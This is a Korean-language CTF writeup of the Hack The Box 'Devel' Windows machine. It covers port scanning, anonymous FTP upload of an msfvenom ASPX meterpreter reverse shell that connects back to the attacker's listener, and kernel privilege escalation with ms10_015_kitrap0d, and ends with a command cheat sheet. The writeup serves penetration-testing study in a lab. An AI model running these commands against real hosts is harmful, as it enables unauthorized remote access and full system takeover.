# HTB Devel Writeup

**OS:** Windows  
**Difficulty:** Easy  
**IP:** 10.129.189.164

---

## 정보 수집

### Nmap 포트 스캔

```bash
nmap -p- --min-rate 10000 -T4 10.129.189.164
```

**결과:**

|PORT|STATE|SERVICE|
|---|---|---|
|21/tcp|open|ftp (Microsoft FTP Service)|
|80/tcp|open|http (IIS)|

> 빠른 포트 발견 후 열린 포트만 버전 스캔하는 것이 효율적

```bash
nmap -sV -sC -p 21,80 10.129.189.164
```

> 또는 netcat으로 배너 그래빙

```bash
nc -nv 10.129.189.164 21
# 220 Microsoft FTP Service
```

---

## 취약점 분석

- **FTP 익명 로그인** 가능
- **FTP 루트 = IIS 웹 루트** (동일 디렉토리)
    - FTP `ls` 시 `iisstart.htm`, `welcome.png` 확인
    - `http://10.129.189.164/iisstart.htm` 브라우저에서 접근 가능
- **IIS 서버** → `.aspx` 파일 실행 가능

---

## 초기 침투 (Initial Foothold)

### 1. ASPX 리버스쉘 생성

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.17.240 LPORT=4444 -f aspx > shell.aspx
```

> `LHOST`는 반드시 `tun0` (HTB VPN) IP 사용

### 2. FTP로 웹쉘 업로드

```bash
ftp 10.129.189.164
# Name: anonymous
# Password: (엔터)

ftp> put shell.aspx
ftp> bye
```

### 3. Metasploit 리스너 실행

```bash
msfconsole
msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST 10.10.17.240
msf> set LPORT 4444
msf> run
```

### 4. 웹쉘 실행

브라우저에서 접속:

```
http://10.129.189.164/shell.aspx
```

**Meterpreter 세션 획득!**

```
[*] Meterpreter session 1 opened (10.10.17.240:4444 → 10.129.189.164:49159)
```

### 5. 시스템 정보 확인

```
meterpreter > getuid
Server username: IIS APPPOOL\Web

meterpreter > sysinfo
Computer    : DEVEL
OS          : Windows 7 (6.1 Build 7600)
Architecture: x86
```

---

## 권한 상승 (Privilege Escalation)

### 1. Local Exploit Suggester 실행

```bash
meterpreter > background

msf> use post/multi/recon/local_exploit_suggester
msf> set SESSION 1
msf> run
```

**추천된 익스플로잇:**

- `exploit/windows/local/bypassuac_comhijack`
- `exploit/windows/local/bypassuac_eventvwr`
- `exploit/windows/local/ms10_015_kitrap0d` ✅

> `bypassuac` 계열은 Administrators 그룹 권한이 필요해서 `IIS APPPOOL\Web`에서는 동작하지 않음

### 2. MS10-015 Kitrap0d 실행

Windows 7 x86 커널 취약점으로 SYSTEM 권한 획득

```bash
msf> use exploit/windows/local/ms10_015_kitrap0d
msf> set SESSION 1
msf> set LHOST 10.10.17.240
msf> run
```

**SYSTEM 권한 획득!**

```
[*] Meterpreter session 4 opened
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## 플래그 획득

```bash
meterpreter > shell

# User Flag
C:\> type C:\Users\babis\Desktop\user.txt

# Root Flag
C:\> type C:\Users\Administrator\Desktop\root.txt
```

---

## 공격 흐름 요약

```
Nmap 스캔
  → FTP 익명 로그인 + IIS 웹루트 공유 발견
    → msfvenom으로 ASPX 웹쉘 생성
      → FTP put으로 업로드
        → 브라우저 실행 → Meterpreter 세션 획득 (IIS APPPOOL\Web)
          → local_exploit_suggester로 취약점 탐색
            → ms10_015_kitrap0d로 SYSTEM 권한 상승
              → user.txt & root.txt 획득 🏆
```

---

## 핵심 명령어 정리

|목적|명령어|
|---|---|
|빠른 포트 스캔|`nmap -p- --min-rate 10000 -T4 <IP>`|
|배너 그래빙|`nc -nv <IP> 21`|
|웹쉘 생성|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<tun0 IP> LPORT=4444 -f aspx > shell.aspx`|
|FTP 업로드|`ftp> put shell.aspx`|
|권한 탐색|`post/multi/recon/local_exploit_suggester`|
|권한 상승|`exploit/windows/local/ms10_015_kitrap0d`|

---

## 배운 점

- FTP 루트와 웹 루트가 같을 경우 파일 업로드 → RCE 가능
- IIS 서버에서는 `.aspx` 페이로드 사용
- `LHOST`는 항상 `tun0` (VPN) IP 사용
- `bypassuac`는 일정 권한 이상 있어야 동작 → 낮은 권한에서는 커널 익스플로잇 사용
- `local_exploit_suggester`로 권한 상승 경로를 빠르게 탐색 가능